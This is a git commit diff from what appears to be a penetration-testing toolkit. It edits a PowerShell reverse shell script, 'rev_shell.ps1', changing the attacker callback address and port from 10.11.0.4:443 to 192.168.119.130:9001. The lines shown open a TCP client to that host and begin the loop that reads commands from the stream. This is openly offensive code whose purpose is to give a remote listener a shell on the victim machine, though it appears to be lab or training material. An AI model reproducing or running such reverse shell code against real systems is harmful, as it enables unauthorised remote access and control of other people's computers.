7f13635614ae66bb40fb54ee40fab9e8980c7e7b
pop <joshmerrill255@gmail.com>
2022-12-27 02:52:32 -0500

    password attackin'

--- practical_tools/powershell/rev_shell.ps1
+++ practical_tools/powershell/rev_shell.ps1
@@ -1,4 +1,4 @@
-$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);
+$client = New-Object System.Net.Sockets.TCPClient('192.168.119.130',9001);
 $stream = $client.GetStream();
 [byte[]]$bytes = 0..65535|%{0};
 while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
